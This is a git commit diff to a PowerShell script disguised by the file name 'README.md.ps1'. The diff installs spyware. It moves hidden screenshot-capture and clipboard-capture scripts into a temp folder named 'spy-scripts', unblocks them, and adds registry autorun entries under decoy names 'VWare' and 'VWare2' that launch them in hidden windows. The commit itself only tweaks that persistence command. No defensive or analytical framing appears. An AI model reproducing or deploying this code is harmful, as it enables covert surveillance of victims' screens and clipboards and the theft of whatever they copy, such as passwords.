07aed4f3715343e174be2126bbfecc83d230a1bc
Niquill0 <85759792+nicovarvara@users.noreply.github.com>
2024-12-18 17:18:44 -0300

    Update README.md.ps1

--- README.md.ps1
+++ README.md.ps1
@@ -4,5 +4,5 @@ New-Item -Path "$env:TEMP\Collection" -ItemType Directory -Force
 Move-Item -Path ".\.screenshots.ps1" "$env:TEMP\spy-scripts\"
 Move-Item -Path ".\.clipboard.ps1" "$env:TEMP\spy-scripts\"
 Unblock-File "$env:TEMP\spy-scripts\*"
-New-ItemProperty -Path $registryPath -Name "VWare" -Value 'start /b powershell.exe -WindowStyle Hidden -File "$env:TEMP\spy-scripts\.screenshots.ps1"' -PropertyType String -Force
-New-ItemProperty -Path $registryPath -Name "VWare2" -Value 'start /b powershell.exe -WindowStyle Hidden -File "$env:TEMP\spy-scripts\.clipboard.ps1"' -PropertyType String -Force
+New-ItemProperty -Path $registryPath -Name "VWare" -Value 'powershell.exe -WindowStyle Hidden -File "$env:TEMP\spy-scripts\.screenshots.ps1"' -PropertyType String -Force
+New-ItemProperty -Path $registryPath -Name "VWare2" -Value 'powershell.exe -WindowStyle Hidden -File "$env:TEMP\spy-scripts\.clipboard.ps1"' -PropertyType String -Force
